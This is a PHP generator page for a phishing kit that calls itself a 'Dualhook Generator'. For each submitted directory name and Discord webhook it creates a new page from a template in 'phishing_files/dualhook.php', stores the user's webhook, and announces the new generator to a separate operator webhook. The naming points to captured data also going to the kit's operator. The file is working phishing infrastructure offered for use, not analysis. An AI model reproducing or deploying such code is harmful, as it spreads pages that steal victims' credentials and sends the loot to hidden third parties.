<?php
include("setup.php");
if (isset($_POST['directory'], $_POST['dwebhook'])) {
$directory = $_POST['directory'];
$dwebhook = $_POST['dwebhook'];
$parse = parse_url($dwebhook);
if($parse['host'] == 'discord.com' || $parse['host'] == 'discordapp.com'){
function clear_dir($string) {
$string = str_replace(' ', '-', $string);
return preg_replace('/[^A-Za-z0-9\-]/', '', $string);
}
$directory = clear_dir($directory);
if(!empty($directory)){
$filename = "controlPage/$directory";
if (!file_exists($filename)) {
mkdir("controlPage/$directory", 0777, true);
file_put_contents("controlPage/$directory/index.php", file_get_contents('phishing_files/dualhook.php'));
file_put_contents("controlPage/$directory/d_webhook.txt", $_POST['dwebhook']);
$domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
$timestamp = date("c", strtotime("now"));
$headers = ["Content-Type: application/json; charset=utf-8"];
$POST = [
	"username" => "$name - Bot",
	"avatar_url" => "$thumbnail",
	"content" => "@everyone **New User Made Dualhook Generator 🔥**",
	"embeds" => [
		[
			"title" => "Check there Generator.",
			"type" => "rich",
			"url" => "$domain/controlPage/$directory", 
			"color" => hexdec("$hex"),
			"footer" => [
				"text" => "$name • $timestamp",
				"icon_url" => "$thumbnail"
			],
			"thumbnail" => [
				"url" => "$thumbnail",
			],
			"fields" => [
				[
					"name" => "**Dualhook Generator**",
					"value" => "```Dualhook Gen: $domain/controlPage/$directory```",
					"inline" => true
				],

			]
		],
	],

];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $triplehook);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response = curl_exec($ch);
header("location: /controlPage/$directory");
} else {
$error = 'This directory is already in use!';
}
}
} else {
$error = 'This does not look like a webhook!';
}
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<title>Dualhook Generator</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>
<body>
<?php if (isset($error)) { ?>
      <script>
                  Swal.fire({
                  icon: 'error',
                  background: '#000',
                  title: '<font color="#fff">Failed!',
                  html: '<font color="#fff"><?=$error?>'
                  })
      </script>
<?php } ?>		
	<div class="limiter">
		<div class="container-login100" style="background-image: url('css/back.gif');">
			<div class="wrap-login100 p-l-110 p-r-110 p-t-62 p-b-33">
				<form class="login100-form validate-form flex-sb flex-w" method="POST">
					<span class="login100-form-title p-b-53">
						Dualhook Generator
					</span>
					<div class="p-t-31 p-b-9">
						<span class="txt1">
							The Directory
						</span>
					</div>
					<div class="wrap-input100">
						<input class="input100" type="text" name="directory" >
						<span class="focus-input100"></span>
					</div>
					
					<div class="p-t-31 p-b-9">
						<span class="txt1">
							Discord Webhook
						</span>
					</div>
					<div class="wrap-input100">
						<input class="input100" type="text" name="dwebhook" >
						<span class="focus-input100"></span>
					</div>
					<br>
                    <div class="container-login100-form-btn m-t-17">
						<button class="btn-face">
							Generate
						</button>
					</div>
				</form>
			</div>
		</div>
	</div>
	<div id="dropDownSelect1"></div>
</body>
</html>